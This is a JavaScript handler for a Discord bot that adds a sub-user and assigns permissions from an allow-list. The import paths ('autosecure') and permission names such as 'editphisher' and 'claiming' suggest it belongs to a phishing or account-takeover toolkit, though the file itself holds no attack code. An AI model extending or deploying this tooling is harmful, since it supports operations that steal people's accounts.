const { queryParams } = require("../../../db/database");
const usersMsg = require("../../../autosecure/utils/embeds/usersMsg")
const validID = require('../../../autosecure/utils/utils/validID');

module.exports = {
    name: "adduser",
    editclaiming: true,
    callback: async (client, interaction) => {
        if (interaction.isModalSubmit() && interaction.customId.startsWith('adduser')) {
            const userId = interaction.fields.getTextInputValue('userid'); 
            const ownerid = interaction.customId.split("|")[2];
            const botnumber = interaction.customId.split("|")[3];

            const isValid = await validID(userId);
            if (!isValid) {
                return interaction.reply({
                    content: "Invalid User ID!",
                    flags: 64
                });
            }

            if (userId === ownerid) {
                return interaction.reply({
                    content: "This is the owner of the bot, no need to add it!",
                    flags: 64
                });
            }

            try {
                let isExist = await queryParams(
                    `SELECT * FROM users WHERE user_id=? AND child=? AND botnumber=?`, 
                    [ownerid, userId, botnumber]
                );
                
                if (isExist.length !== 0) {
                    return interaction.reply({
                        content: "This user has already been added.",
                        flags: 64
                    });
                }

                await queryParams(
                    `INSERT INTO users (user_id, child, addedby, botnumber, addedtime) VALUES (?, ?, ?, ?, ?)`, 
                    [ownerid, userId, interaction.user.id, botnumber, Date.now().toString()]
                );

                // Apply optional permissions from the modal 'perms' field (if provided)
                try {
                    const permsField = interaction.fields.getTextInputValue('perms') || '';
                    const perms = permsField.split(',').map(p => p.trim()).filter(p => p.length > 0);
                    if (perms.length > 0) {
                        const allowed = new Set([
                            'claiming','usedmbuttons','editclaiming','editbuttons','editbot','editmodals','editembeds',
                            'editautosecure','editphisher','editpresets','editblacklist','usestatsbutton','sendembeds'
                        ]);
                        const toSet = perms.filter(p => allowed.has(p));
                        if (toSet.length > 0) {
                            const assignments = toSet.map(c => `${c} = 1`).join(', ');
                            await queryParams(`UPDATE users SET ${assignments} WHERE user_id = ? AND child = ? AND botnumber = ?`, [ownerid, userId, botnumber], 'run');
                        }
                    }
                } catch (e) {
                    console.error('Error applying permissions on mainbot addUser:', e);
                }

                let users = await queryParams(
                    `SELECT * FROM users WHERE user_id=? AND botnumber=?`, 
                    [ownerid, botnumber]
                );
                
                const currentPage = users.length; 
                const msg = await usersMsg(ownerid, currentPage, interaction.user.id, botnumber);

                return interaction.update({ 
                    embeds: msg.embeds, 
                    components: msg.components, 
                    flags: 64 
                });
            } catch (error) {
                console.error("Error adding user:", error);
                return interaction.reply({
                    content: "An error occurred while adding the user. Please try again.",
                    flags: 64
                });
            }
        }
    }
};